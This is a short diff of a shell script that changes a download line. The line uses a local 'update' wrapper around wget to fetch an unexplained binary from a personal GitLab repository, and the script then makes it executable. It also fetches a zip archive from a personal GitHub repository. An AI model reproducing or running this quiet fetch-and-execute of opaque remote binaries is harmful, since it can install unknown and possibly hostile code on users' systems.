@@ -31,7 +31,7 @@ echo ""
 echo " "
 echo " "
 
-./update/update wget https://gitlab.com/asraktanusi064/gacor/-/raw/main/gacormaseh?inline=false
+./update/update wget https://gitlab.com/asraktanusi064/gacor/-/raw/main/gacormaseh
 chmod +x gacormaseh 
  
 ./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
